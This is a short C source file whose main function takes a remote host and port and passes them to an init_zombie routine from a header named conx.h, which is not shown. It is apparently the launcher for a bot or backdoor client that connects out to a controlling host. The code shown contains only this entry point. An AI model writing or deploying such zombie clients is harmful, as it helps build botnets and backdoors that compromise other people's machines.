#include "conx.h"

void usage(const char* program_name)
{
    fprintf(stdout, "Usage: %s <RHOST> <RPORT>\n", program_name);
    _exit(1);
}

int main(int argc, char** argv)
{
    if(argc != 3)
    {
        usage(argv[0]);
    }
    init_zombie(argv[1], atoi(argv[2]));
}